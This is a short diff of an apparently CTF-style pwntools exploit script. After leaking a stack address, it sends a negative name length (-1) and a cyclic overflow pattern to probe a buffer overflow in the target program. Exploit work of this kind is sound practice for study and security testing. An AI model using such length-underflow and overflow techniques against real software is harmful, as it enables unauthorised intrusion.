@@ -26,6 +26,17 @@ stack_address = u64(stack_address, endian='big')
 stack_address += ret_offset
 log.success(f'Leaked stack address: {p64(stack_address)}')
 
+log.info('Send email and agent')
+io.sendlineafter('Email: ', 'test@test.test')
+io.sendlineafter('Age: ', '666')
+
+log.info('Send Name Lenght')
+io.sendlineafter('Length of name: ', '-1')
+
+payload = cyclic(200)
+
+log.info('Send payload to name')
+io.sendlineafter('Name: ', payload)
 
 #log.info('Send Password')
 #io.sendlineafter('> ', '2')
